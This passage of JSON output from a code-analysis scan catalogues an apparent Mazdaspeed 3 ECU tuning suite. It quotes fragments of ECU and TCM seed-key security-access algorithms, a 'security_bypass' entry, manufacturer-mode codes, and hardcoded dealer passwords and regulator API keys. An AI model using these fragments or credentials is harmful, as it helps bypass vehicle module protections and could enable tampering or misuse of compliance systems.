"0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 147, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 347, "protocol": "J2534", "content": "\"Use advanced J2534 tool\","}], "hardware_assumptions": [{"type": "hardware", "line": 23, "hardware": "ECU", "content": "class ECUMemoryAddress:"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"ECU MEMORY ADDRESS MAPPING - MAZDASPEED 3 SPECIFIC\"\"\""}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "ECU_MEMORY_MAP = {"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"ignition_base\": ECUMemoryAddress("}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "\"ignition_advance\": ECUMemoryAddress("}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "\"fuel_base\": ECUMemoryAddress("}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "\"fuel_compensation\": ECUMemoryAddress("}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "\"boost_target\": ECUMemoryAddress("}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "\"wastegate_duty\": ECUMemoryAddress("}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "\"vvt_intake\": ECUMemoryAddress("}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "\"vvt_exhaust\": ECUMemoryAddress("}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "\"rev_limit\": ECUMemoryAddress("}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "\"boost_limit\": ECUMemoryAddress("}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "\"knock_learn\": ECUMemoryAddress("}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "\"fuel_trim_learn\": ECUMemoryAddress("}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "Calculate security key for ECU access (Service 0x27)"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "seed: 4-byte hex string from ECU (e.g., \"A1B2C3D4\")"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "4-byte hex key for security access"}, {"type": "hardware", "line": 132, "hardware": "TCM", "content": "def calculate_tcm_seed_key(seed: str) -> str:"}, {"type": "hardware", "line": 134, "hardware": "ECU", "content": "Calculate security key for Transmission Control Module"}, {"type": "hardware", "line": 137, "hardware": "TCM", "content": "seed: 2-byte hex string from TCM"}, {"type": "hardware", "line": 140, "hardware": "TCM", "content": "2-byte hex key for TCM access"}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "\"security_reset\": \"SEC-RES-MAZDA-2024\","}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "def execute_manufacturer_mode(access_code: str) -> bool:"}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "\"security_bypass\": \"Special key sequence during boot\""}, {"type": "hardware", "line": 335, "hardware": "ECU", "content": "\"Navigate to 'Service Functions' -> 'ECU Reset'\","}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "\"Execute with ignition ON, engine OFF\","}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "\"purpose\": \"Reset ECU programming counter\","}, {"type": "hardware", "line": 388, "hardware": "ECU", "content": "\"purpose\": \"Program injector flow rates to ECU\","}, {"type": "hardware", "line": 410, "hardware": "TCM", "content": "Reset TCM adaptation for clutch replacement or issues"}, {"type": "hardware", "line": 413, "hardware": "TCM", "content": "\"1. Connect diagnostic tool with TCM access\","}, {"type": "hardware", "line": 417, "hardware": "vehicle", "content": "\"5. Drive vehicle: 0-30 mph light throttle, 30-0 mph coast down\","}, {"type": "hardware", "line": 505, "hardware": "vehicle", "content": "\"\"\"Apply adjustments based on vehicle modifications\"\"\""}, {"type": "hardware", "line": 521, "hardware": "ECU", "content": "\"\"\"Recursively update nested dictionaries\"\"\""}, {"type": "hardware", "line": 550, "hardware": "ECU", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "hardware", "line": 553, "hardware": "ECU", "content": "ecu_key = software.seed_key.calculate_ecu_seed_key(test_seed)"}, {"type": "hardware", "line": 554, "hardware": "TCM", "content": "tcm_key = software.seed_key.calculate_tcm_seed_key(\"1A2B\")"}, {"type": "hardware", "line": 555, "hardware": "ECU", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "hardware", "line": 556, "hardware": "TCM", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "hardware", "line": 581, "hardware": "ECU", "content": "manufacturer_access = software.dealer_tool.execute_manufacturer_mode("}, {"type": "hardware", "line": 596, "hardware": "ECU", "content": "print(\"\\n5. ECU MEMORY MAP ACCESS\")"}, {"type": "hardware", "line": 598, "hardware": "ECU", "content": "ignition_map = ECU_MEMORY_MAP[\"ignition_base\"]"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "class MazdaSeedKeyAlgorithm:"}, {"type": "security_pattern", "line": 98, "pattern": "seed", "content": "class MazdaSeedKeyAlgorithm:"}, {"type": "security_pattern", "line": 98, "pattern": "algorithm", "content": "class MazdaSeedKeyAlgorithm:"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "COMPLETE SEED-KEY ALGORITHM IMPLEMENTATION"}, {"type": "security_pattern", "line": 100, "pattern": "seed", "content": "COMPLETE SEED-KEY ALGORITHM IMPLEMENTATION"}, {"type": "security_pattern", "line": 100, "pattern": "algorithm", "content": "COMPLETE SEED-KEY ALGORITHM IMPLEMENTATION"}, {"type": "security_pattern", "line": 105, "pattern": "key", "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 105, "pattern": "seed", "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 107, "pattern": "key", "content": "Calculate security key for ECU access (Service 0x27)"}, {"type": "security_pattern", "line": 110, "pattern": "seed", "content": "seed: 4-byte hex string from ECU (e.g., \"A1B2C3D4\")"}, {"type": "security_pattern", "line": 113, "pattern": "key", "content": "4-byte hex key for security access"}, {"type": "security_pattern", "line": 115, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 116, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 121, "pattern": "seed", "content": "temp = seed_bytes[i] ^ 0x73"}, {"type": "security_pattern", "line": 127, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 129, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 132, "pattern": "key", "content": "def calculate_tcm_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 132, "pattern": "seed", "content": "def calculate_tcm_seed_key(seed: str) -> str:"}, {"type": "security_pattern", "line": 134, "pattern": "key", "content": "Calculate security key for Transmission Control Module"}, {"type": "security_pattern", "line": 137, "pattern": "seed", "content": "seed: 2-byte hex string from TCM"}, {"type": "security_pattern", "line": 140, "pattern": "key", "content": "2-byte hex key for TCM access"}, {"type": "security_pattern", "line": 142, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 143, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 146, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 147, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 147, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 148, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 149, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 151, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 321, "pattern": "key", "content": "\"security_bypass\": \"Special key sequence during boot\""}, {"type": "security_pattern", "line": 428, "pattern": "key", "content": "self.seed_key = MazdaSeedKeyAlgorithm()"}, {"type": "security_pattern", "line": 428, "pattern": "seed", "content": "self.seed_key = MazdaSeedKeyAlgorithm()"}, {"type": "security_pattern", "line": 428, "pattern": "algorithm", "content": "self.seed_key = MazdaSeedKeyAlgorithm()"}, {"type": "security_pattern", "line": 522, "pattern": "key", "content": "for key, value in update.items():"}, {"type": "security_pattern", "line": 523, "pattern": "key", "content": "if isinstance(value, dict) and key in original:"}, {"type": "security_pattern", "line": 524, "pattern": "key", "content": "original[key] = self._deep_update(original[key], value)"}, {"type": "security_pattern", "line": 526, "pattern": "key", "content": "original[key] = value"}, {"type": "security_pattern", "line": 537, "pattern": "hash", "content": "return hashlib.md5(str(random.getrandbits(256)).encode()).hexdigest()[:16]"}, {"type": "security_pattern", "line": 550, "pattern": "key", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "security_pattern", "line": 550, "pattern": "seed", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "security_pattern", "line": 550, "pattern": "algorithm", "content": "print(\"\\n1. SECURITY ACCESS - SEED-KEY ALGORITHM\")"}, {"type": "security_pattern", "line": 552, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 553, "pattern": "key", "content": "ecu_key = software.seed_key.calculate_ecu_seed_key(test_seed)"}, {"type": "security_pattern", "line": 553, "pattern": "seed", "content": "ecu_key = software.seed_key.calculate_ecu_seed_key(test_seed)"}, {"type": "security_pattern", "line": 554, "pattern": "key", "content": "tcm_key = software.seed_key.calculate_tcm_seed_key(\"1A2B\")"}, {"type": "security_pattern", "line": 554, "pattern": "seed", "content": "tcm_key = software.seed_key.calculate_tcm_seed_key(\"1A2B\")"}, {"type": "security_pattern", "line": 555, "pattern": "key", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "security_pattern", "line": 555, "pattern": "seed", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "security_pattern", "line": 556, "pattern": "key", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "security_pattern", "line": 556, "pattern": "seed", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts16.py", "lines_read": 785, "features_found": [{"type": "function", "name": "export_complete_configuration", "line": 707}, {"type": "function", "name": "__init__", "line": 48}, {"type": "function", "name": "_get_j2534_configs", "line": 53}, {"type": "function", "name": "_get_can_bus_configs", "line": 117}, {"type": "function", "name": "_get_obd_adapter_specs", "line": 143}, {"type": "function", "name": "__init__", "line": 175}, {"type": "function", "name": "_get_target_vehicle", "line": 180}, {"type": "function", "name": "_get_ecu_data", "line": 190}, {"type": "function", "name": "_get_baseline_tunes", "line": 213}, {"type": "function", "name": "__init__", "line": 259}, {"type": "function", "name": "_get_manufacturer_codes", "line": 265}, {"type": "function", "name": "_get_dealer_credentials", "line": 292}, {"type": "function", "name": "_get_government_endpoints", "line": 314}, {"type": "function", "name": "_generate_encryption_keys", "line": 339}, {"type": "function", "name": "_hash_password", "line": 349}, {"type": "function", "name": "_generate_session_key", "line": 353}, {"type": "function", "name": "__init__", "line": 360}, {"type": "function", "name": "_get_stock_maps", "line": 365}, {"type": "function", "name": "_get_race_calibrations", "line": 426}, {"type": "function", "name": "_get_safety_limits", "line": 447}, {"type": "function", "name": "__init__", "line": 483}, {"type": "function", "name": "_get_dtc_samples", "line": 488}, {"type": "function", "name": "_get_performance_logs", "line": 541}, {"type": "function", "name": "_get_crash_data_samples", "line": 571}, {"type": "function", "name": "__init__", "line": 611}, {"type": "function", "name": "_get_database_config", "line": 616}, {"type": "function", "name": "_get_api_config", "line": 645}, {"type": "function", "name": "_get_docker_config", "line": 667}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "base64", "line": null}], "components_found": [{"type": "class", "name": "J2534DeviceConfig", "line": 19}, {"type": "class", "name": "CANBusConfig", "line": 28}, {"type": "class", "name": "VehicleTarget", "line": 37}, {"type": "class", "name": "HardwareInterfaceConfig", "line": 45}, {"type": "class", "name": "VehicleSpecificData", "line": 172}, {"type": "class", "name": "SecurityCredentials", "line": 256}, {"type": "class", "name": "CalibrationData", "line": 357}, {"type": "class", "name": "TestingData", "line": 480}, {"type": "class", "name": "SystemConfiguration", "line": 608}], "algorithms": [], "protocols": [{"type": "protocol", "line": 19, "protocol": "J2534", "content": "class J2534DeviceConfig:"}, {"type": "protocol", "line": 20, "protocol": "J2534", "content": "\"\"\"J2534 PASSTHROUGH DEVICE CONFIGURATION\"\"\""}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "class CANBusConfig:"}, {"type": "protocol", "line": 29, "protocol": "CAN", "content": "\"\"\"CAN BUS INTERFACE SPECIFICATION\"\"\""}, {"type": "protocol", "line": 53, "protocol": "J2534", "content": "def _get_j2534_configs(self) -> Dict[str, J2534DeviceConfig]:"}, {"type": "protocol", "line": 54, "protocol": "J2534", "content": "\"\"\"J2534 DEVICE CONFIGURATIONS\"\"\""}, {"type": "protocol", "line": 56, "protocol": "J2534", "content": "'tactrix_openport_2_0': J2534DeviceConfig("}, {"type": "protocol", "line": 62, "protocol": "CAN", "content": "'protocol': 'CAN_29BIT',"}, {"type": "protocol", "line": 65, "protocol": "CAN", "content": "'pin_6': 'CAN_HIGH',"}, {"type": "protocol", "line": 66, "protocol": "CAN", "content": "'pin_14': 'CAN_LOW',"}, {"type": "protocol", "line": 75, "protocol": "CAN", "content": "'ISO15765', 'ISO14230', 'ISO9141', 'J1850', 'CAN_11BIT', 'CAN_29BIT'"}, {"type": "protocol", "line": 78, "protocol": "J2534", "content": "'mpps_v18': J2534DeviceConfig("}, {"type": "protocol", "line": 84, "protocol": "KWP", "content": "'protocol': 'KWP2000',"}, {"type": "protocol", "line": 95, "protocol": "KWP", "content": "supported_protocols=['KWP2000', 'ISO9141']"}, {"type": "protocol", "line": 97, "protocol": "J2534", "content": "'drewtech_mongoose': J2534DeviceConfig("}, {"type": "protocol", "line": 103, "protocol": "CAN", "content": "'protocol': 'CAN_29BIT',"}, {"type": "protocol", "line": 106, "protocol": "CAN", "content": "'pin_6': 'CAN_HIGH',"}, {"type": "protocol", "line": 107, "protocol": "CAN", "content": "'pin_14': 'CAN_LOW',"}, {"type": "protocol", "line": 113, "protocol": "CAN", "content": "supported_protocols=['ISO15765', 'CAN_11BIT', 'CAN_29BIT', 'J1850']"}, {"type": "protocol", "line": 117, "protocol": "CAN", "content": "def _get_can_bus_configs(self) -> Dict[str, CANBusConfig]:"}, {"type": "protocol", "line": 118, "protocol": "CAN", "content": "\"\"\"CAN BUS INTERFACE CONFIGURATIONS\"\"\""}, {"type": "protocol", "line": 120, "protocol": "CAN", "content": "'mazdaspeed3_high_speed': CANBusConfig("}, {"type": "protocol", "line": 127, "protocol": "CAN", "content": "'mazdaspeed3_medium_speed': CANBusConfig("}, {"type": "protocol", "line": 134, "protocol": "CAN", "content": "'diagnostic_can': CANBusConfig("}, {"type": "protocol", "line": 144, "protocol": "OBD", "content": "\"\"\"OBD-II ADAPTER SPECIFICATIONS\"\"\""}, {"type": "protocol", "line": 148, "protocol": "OBD", "content": "'description': 'Bluetooth OBD2 adapter',"}, {"type": "protocol", "line": 149, "protocol": "CAN", "content": "'protocols': ['CAN_11BIT', 'CAN_29BIT', 'ISO15765', 'KWP2000'],"}, {"type": "protocol", "line": 149, "protocol": "KWP", "content": "'protocols': ['CAN_11BIT', 'CAN_29BIT', 'ISO15765', 'KWP2000'],"}, {"type": "protocol", "line": 151, "protocol": "OBD", "content": "'pinout': 'Standard OBD2',"}, {"type": "protocol", "line": 155, "protocol": "OBD", "content": "'model': 'OBDLink MX+',"}, {"type": "protocol", "line": 159, "protocol": "OBD", "content": "'pinout': 'Standard OBD2',"}, {"type": "protocol", "line": 164, "protocol": "J2534", "content": "'description': 'Professional J2534 passthrough',"}, {"type": "protocol", "line": 209, "protocol": "0x[0-9A-Fa-f]+", "content": "'access_methods': ['0x27', '0x29', '0x31']"}, {"type": "protocol", "line": 310, "protocol": "J2534", "content": "'authentication_protocol': 'Mazda_J2534_Auth_v2'"}, {"type": "protocol", "line": 335, "protocol": "J2534", "content": "'connectivity_standard': 'SAE J2534-2'"}, {"type": "protocol", "line": 752, "protocol": "J2534", "content": "print(f\"   - J2534 Devices: {len(hardware.j2534_devices)}\")"}, {"type": "protocol", "line": 753, "protocol": "CAN", "content": "print(f\"   - CAN Bus Configs: {len(hardware.can_bus_configs)}\")"}, {"type": "protocol", "line": 754, "protocol": "OBD", "content": "print(f\"   - OBD Adapters: {len(hardware.obd_adapters)}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "COMPLETE HARDWARE & SECURITY CONFIGURATION FOR MAZDASPEED 3 TUNING SUITE"}, {"type": "hardware", "line": 29, "hardware": "CAN bus", "content": "\"\"\"CAN BUS INTERFACE SPECIFICATION\"\"\""}, {"type": "hardware", "line": 37, "hardware": "vehicle", "content": "class VehicleTarget:"}, {"type": "hardware", "line": 38, "hardware": "vehicle", "content": "\"\"\"TARGET VEHICLE SPECIFICATION\"\"\""}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "ecu_calibration_id: str"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "ecu_software_version: str"}, {"type": "hardware", "line": 118, "hardware": "CAN bus", "content": "\"\"\"CAN BUS INTERFACE CONFIGURATIONS\"\"\""}, {"type": "hardware", "line": 168, "hardware": "ECU", "content": "'advantages': 'Best for ECU flashing and advanced diagnostics'"}, {"type": "hardware", "line": 172, "hardware": "vehicle", "content": "class VehicleSpecificData:"}, {"type": "hardware", "line": 173, "hardware": "vehicle", "content": "\"\"\"COMPLETE VEHICLE-SPECIFIC DATA CONFIGURATION\"\"\""}, {"type": "hardware", "line": 176, "hardware": "vehicle", "content": "self.target_vehicle = self._get_target_vehicle()"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "self.ecu_data = self._get_ecu_data()"}, {"type": "hardware", "line": 180, "hardware": "vehicle", "content": "def _get_target_vehicle(self) -> VehicleTarget:"}, {"type": "hardware", "line": 181, "hardware": "vehicle", "content": "\"\"\"TARGET VEHICLE SPECIFICATION\"\"\""}, {"type": "hardware", "line": 182, "hardware": "vehicle", "content": "return VehicleTarget("}, {"type": "hardware", "line": 186, "hardware": "ECU", "content": "ecu_calibration_id=\"L3K9-18S881-AE\","}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "ecu_software_version=\"V2.3.1_2011\""}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "def _get_ecu_data(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "\"\"\"ECU CALIBRATION AND SOFTWARE DATA\"\"\""}, {"type": "hardware", "line": 193, "hardware": "ECU", "content": "'ecu_hardware': {"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "'security_data': {"}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "'security_levels': [1, 3, 7],"}, {"type": "hardware", "line": 241, "hardware": "vehicle", "content": "'description': 'Current vehicle baseline before tuning',"}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "class SecurityCredentials:"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "\"\"\"SECURITY CREDENTIALS AND ACCESS CONFIGURATION\"\"\""}, {"type": "hardware", "line": 270, "hardware": "ECU", "content": "'security_level': 'FACTORY_ENGINEERING',"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "'Security bypass',"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "'security_algorithms': {"}, {"type": "hardware", "line": 285, "hardware": "ECU", "content": "'ecu_seed_key': 'Mazda_M12R_v3.4',"}, {"type": "hardware", "line": 286, "hardware": "TCM", "content": "'tcm_seed_key': 'Mazda_TCM_v2.1',"}, {"type": "hardware", "line": 287, "hardware": "immobilizer", "content": "'immobilizer': 'Mazda_IM4_v5.2_TDES',"}, {"type": "hardware", "line": 318, "hardware": "vehicle", "content": "'endpoint': 'https://epa-vehicle-testing.gov/api/v1/submit',"}, {"type": "hardware", "line": 323, "hardware": "vehicle", "content": "'endpoint': 'https://carb.ca.gov/vehicle-compliance/api',"}, {"type": "hardware", "line": 330, "hardware": "ABS", "content": "'safety_requirements': ['SRS', 'ABS', 'ESC', 'TPMS']"}, {"type": "hardware", "line": 330, "hardware": "SRS", "content": "'safety_requirements': ['SRS', 'ABS', 'ESC', 'TPMS']"}, {"type": "hardware", "line": 334, "hardware": "ECU", "content": "'security_standard': 'SAE J3101',"}, {"type": "hardware", "line": 340, "hardware": "ECU", "content": "\"\"\"GENERATE ENCRYPTION KEYS FOR DATA SECURITY\"\"\""}, {"type": "hardware", "line": 350, "hardware": "ECU", "content": "\"\"\"HASH PASSWORDS FOR SECURE STORAGE\"\"\""}, {"type": "hardware", "line": 366, "hardware": "ECU", "content": "\"\"\"STOCK ECU MAPS FOR COMPARISON\"\"\""}, {"type": "hardware", "line": 519, "hardware": "vehicle", "content": "'vehicle_speed': 68,"}, {"type": "hardware", "line": 527, "hardware": "SRS", "content": "'srs_dtcs': {"}, {"type": "hardware", "line": 534, "hardware": "vehicle", "content": "'vehicle_speed': 25,"}, {"type": "hardware", "line": 572, "hardware": "SRS", "content": "\"\"\"CRASH DATA SAMPLES FOR SRS TESTING\"\"\""}, {"type": "hardware", "line": 581, "hardware": "vehicle", "content": "'vehicle_data': {"}, {"type": "hardware", "line": 637, "hardware": "vehicle", "content": "'vehicle_profiles': 'vehicle_data',"}, {"type": "hardware", "line": 657, "hardware": "vehicle", "content": "'vehicle_api': '/api/v1/vehicle',"}, {"type": "hardware", "line": 658, "hardware": "ECU", "content": "'security_api': '/api/v1/security'"}, {"type": "hardware", "line": 712, "hardware": "vehicle", "content": "'vehicle_specific_data': VehicleSpecificData().__dict__,"}, {"type": "hardware", "line": 713, "hardware": "ECU", "content": "'security_credentials': SecurityCredentials().__dict__,"}, {"type": "hardware", "line": 733, "hardware": "ECU", "content": "\"\"\".format(encryption_key=SecurityCredentials().encryption_keys['data_encryption_key'])"}, {"type": "hardware", "line": 753, "hardware": "CAN bus", "content": "print(f\"   - CAN Bus Configs: {len(hardware.can_bus_configs)}\")"}, {"type": "hardware", "line": 756, "hardware": "vehicle", "content": "print(\"\\n\ud83d\ude97 VEHICLE TARGET CONFIGURED:\")"}, {"type": "hardware", "line": 757, "hardware": "vehicle", "content": "vehicle = VehicleSpecificData()"}, {"type": "hardware", "line": 758, "hardware": "vehicle", "content": "print(f\"   - VIN: {vehicle.target_vehicle.vin}\")"}, {"type": "hardware", "line": 759, "hardware": "ECU", "content": "print(f\"   - ECU Calibration: {vehicle.target_vehicle.ecu_calibration_id}\")"}, {"type": "hardware", "line": 759, "hardware": "vehicle", "content": "print(f\"   - ECU Calibration: {vehicle.target_vehicle.ecu_calibration_id}\")"}, {"type": "hardware", "line": 761, "hardware": "ECU", "content": "print(\"\\n\ud83d\udd10 SECURITY CREDENTIALS LOADED:\")"}, {"type": "hardware", "line": 762, "hardware": "ECU", "content": "security = SecurityCredentials()"}, {"type": "hardware", "line": 763, "hardware": "ECU", "content": "print(f\"   - Manufacturer Codes: {len(security.manufacturer_codes)}\")"}, {"type": "hardware", "line": 764, "hardware": "ECU", "content": "print(f\"   - Dealer Credentials: {len(security.dealer_credentials)}\")"}, {"type": "hardware", "line": 765, "hardware": "ECU", "content": "print(f\"   - Government Endpoints: {len(security.government_endpoints)}\")"}], "security_logic": [{"type": "security_pattern", "line": 12, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 14, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 203, "pattern": "algorithm", "content": "'checksum_algorithm': 'Mazda_CRC16_v2'"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "'seed_algorithm': 'Mazda_M12R_v3.4',"}, {"type": "security_pattern", "line": 206, "pattern": "algorithm", "content": "'seed_algorithm': 'Mazda_M12R_v3.4',"}, {"type": "security_pattern", "line": 207, "pattern": "key", "content": "'key_length': 4,"}, {"type": "security_pattern", "line": 263, "pattern": "key", "content": "self.encryption_keys = self._generate_encryption_keys()"}, {"type": "security_pattern", "line": 263, "pattern": "encrypt", "content": "self.encryption_keys = self._generate_encryption_keys()"}, {"type": "security_pattern", "line": 284, "pattern": "algorithm", "content": "'security_algorithms': {"}, {"type": "security_pattern", "line": 285, "pattern": "key", "content": "'ecu_seed_key': 'Mazda_M12R_v3.4',"}, {"type": "security_pattern", "line": 285, "pattern": "seed", "content": "'ecu_seed_key': 'Mazda_M12R_v3.4',"}, {"type": "security_pattern", "line": 286, "pattern": "key", "content": "'tcm_seed_key': 'Mazda_TCM_v2.1',"}, {"type": "security_pattern", "line": 286, "pattern": "seed", "content": "'tcm_seed_key': 'Mazda_TCM_v2.1',"}, {"type": "security_pattern", "line": 288, "pattern": "key", "content": "'algorithm_implementation': 'See MazdaSeedKeyAlgorithm class'"}, {"type": "security_pattern", "line": 288, "pattern": "seed", "content": "'algorithm_implementation': 'See MazdaSeedKeyAlgorithm class'"}, {"type": "security_pattern", "line": 288, "pattern": "algorithm", "content": "'algorithm_implementation': 'See MazdaSeedKeyAlgorithm class'"}, {"type": "security_pattern", "line": 297, "pattern": "password", "content": "'password_hash': self._hash_password('MazdaTech2024!'),"}, {"type": "security_pattern", "line": 297, "pattern": "hash", "content": "'password_hash': self._hash_password('MazdaTech2024!'),"}, {"type": "security_pattern", "line": 298, "pattern": "key", "content": "'license_key': 'MZDA-LIC-2024-8872-2291',"}, {"type": "security_pattern", "line": 303, "pattern": "password", "content": "'password_hash': self._hash_password('FordTech2024!'),"}, {"type": "security_pattern", "line": 303, "pattern": "hash", "content": "'password_hash': self._hash_password('FordTech2024!'),"}, {"type": "security_pattern", "line": 309, "pattern": "key", "content": "'session_key': self._generate_session_key(),"}, {"type": "security_pattern", "line": 319, "pattern": "key", "content": "'api_key': 'EPA-8872-MAZDA-2024',"}, {"type": "security_pattern", "line": 324, "pattern": "key", "content": "'api_key': 'CARB-8872-2024-MAZDA',"}, {"type": "security_pattern", "line": 329, "pattern": "key", "content": "'api_key': 'NHTSA-8872-MAZDA-2024',"}, {"type": "security_pattern", "line": 339, "pattern": "key", "content": "def _generate_encryption_keys(self) -> Dict[str, str]:"}, {"type": "security_pattern", "line": 339, "pattern": "encrypt", "content": "def _generate_encryption_keys(self) -> Dict[str, str]:"}, {"type": "security_pattern", "line": 340, "pattern": "key", "content": "\"\"\"GENERATE ENCRYPTION KEYS FOR DATA SECURITY\"\"\""}, {"type": "security_pattern", "line": 340, "pattern": "encrypt", "content": "\"\"\"GENERATE ENCRYPTION KEYS FOR DATA SECURITY\"\"\""}, {"type": "security_pattern", "line": 343, "pattern": "key", "content": "'data_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode(),"}, {"type": "security_pattern", "line": 343, "pattern": "encrypt", "content": "'data_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode(),"}, {"type": "security_pattern", "line": 344, "pattern": "key", "content": "'api_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode(),"}, {"type": "security_pattern", "line": 344, "pattern": "encrypt", "content": "'api_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode(),"}, {"type": "security_pattern", "line": 345, "pattern": "key", "content": "'session_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode(),"}, {"type": "security_pattern", "line": 345, "pattern": "encrypt", "content": "'session_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode(),"}, {"type": "security_pattern", "line": 346, "pattern": "key", "content": "'database_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode()"}, {"type": "security_pattern", "line": 346, "pattern": "encrypt", "content": "'database_encryption_key': base64.urlsafe_b64encode(os.urandom(32)).decode()"}, {"type": "security_pattern", "line": 349, "pattern": "password", "content": "def _hash_password(self, password: str) -> str:"}, {"type": "security_pattern", "line": 349, "pattern": "hash", "content": "def _hash_password(self, password: str) -> str:"}, {"type": "security_pattern", "line": 350, "pattern": "password", "content": "\"\"\"HASH PASSWORDS FOR SECURE STORAGE\"\"\""}, {"type": 